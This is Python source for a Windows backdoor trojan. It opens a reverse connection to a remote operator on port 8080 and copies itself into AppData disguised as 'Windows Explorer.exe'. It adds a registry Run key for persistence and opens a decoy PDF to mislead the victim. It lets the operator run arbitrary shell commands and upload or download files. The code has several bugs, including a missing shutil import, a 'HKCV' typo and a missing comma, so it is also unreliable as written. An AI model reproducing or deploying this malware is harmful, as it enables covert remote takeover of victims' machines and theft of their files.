#!/usr/bin/python

import socket, subprocess, json, os, base64, sys

class Backdoor:
	def __init__(self,ip,port):
		self.become_persistent()
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect(("", 8080))

	def become_persistent(self):
		file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(file_location):
			shutil.copyfile(sys.executable, file_location)
			subprocess.call('reg add HKCV\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "' + file_location + '"',shell=True)

	def reliable_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
	def execute_system_commmand(self,command):
		DEVNULL = open(os.devnull, 'wb')
		return subprocess.check_output(command,shell=True, stderr=subprocess.DEVNULL stdin=subprocess.DEVNULL)

	def change_working_directory_to(self,path):
		os.chdir(path)
		return "[+] Change working directory to " + path

	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload Succesful"

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())

	def run(self):
		while True:
			command = self.reliable_receive()
			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_directory_to(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1],command[2])
				else:
			    	command_result = self.execute_system_commmand(command)
			except Exception:
			    command_result = "[-] Error during command Execution"
			self.reliable_send(command_result)

file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
	backdoor = Backdoor("", 8080)
	backdoor.run()
except Exception:
	sys.exit()
